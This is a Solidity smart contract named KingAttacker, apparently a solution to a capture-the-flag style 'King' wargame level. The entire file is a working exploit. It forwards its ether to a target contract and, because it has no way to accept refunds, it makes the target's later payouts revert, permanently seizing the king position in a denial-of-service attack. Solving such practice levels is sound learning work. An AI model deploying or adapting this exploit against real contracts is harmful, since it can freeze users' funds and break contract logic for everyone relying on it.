// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    constructor() payable {}

    function attack(address target) public {
        (bool success, ) = target.call{ value: address(this).balance}("");
        require(success);
    }
}